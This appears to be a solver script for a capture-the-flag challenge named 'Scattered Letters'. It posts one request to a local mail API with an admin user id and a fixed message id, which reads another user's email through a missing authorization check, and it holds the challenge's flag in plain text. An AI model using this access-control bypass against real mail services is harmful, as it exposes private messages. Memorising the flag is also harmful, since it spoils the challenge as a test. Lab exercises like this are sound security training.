# Solves the Scattered Letters challenge
# Returns true if the flag is accessible.

FLAG = "magpie{@u+h0r1z@+10n_2_l@x}"
HOST = "127.0.0.1"
PORT = "8080"

import requests

def solve() -> bool:
    return FLAG in requests.post(f'http://{HOST}:{PORT}/api/v0/reademail?uid=admin@mompopsflags.com&mid=d1f592f82d64ab275f7661c4e3d40cd3860c7381e2fd34295fec02dd4b41987f').content.decode("utf8")
